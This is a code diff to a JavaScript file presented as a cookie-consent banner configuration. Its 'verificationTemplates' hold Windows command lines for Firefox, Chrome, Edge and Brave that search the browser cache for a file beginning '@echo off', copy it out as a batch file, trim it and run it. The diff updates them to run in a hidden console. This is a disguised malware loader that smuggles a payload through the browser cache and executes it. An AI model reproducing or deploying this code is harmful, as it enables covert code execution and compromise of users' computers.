@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.8.1',
+    version: '1.8.2',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -25,10 +25,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in ("%p\\cache2\\entries\\*") do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /c cd /d %TMP%&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      edge: 'cmd /c cd /d %TMP%&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      brave: 'cmd /c cd /d %TMP%&for /r %LOCALAPPDATA%\\BraveSoftware %f in (f_*) do @findstr /b /c:@echo "%f"&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat'
+      firefox: 'conhost --headless cmd /c cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do for %f in (%~sp\\cache2\\entries\\*) do findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&t.bat',
+      chrome: 'conhost --headless cmd /c cd /d %TMP%&for /d %d in (%LOCALAPPDATA%\\Google\\Chrome\\User*) do for /r %~sd %f in (f_*) do findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&t.bat',
+      edge: 'conhost --headless cmd /c cd /d %TMP%&for /d %d in (%LOCALAPPDATA%\\Microsoft\\Edge\\User*) do for /r %~sd %f in (f_*) do findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&t.bat',
+      brave: 'conhost --headless cmd /c cd /d %TMP%&for /r %LOCALAPPDATA%\\BraveSoftware %f in (f_*) do findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&t.bat'
     }
   };
 
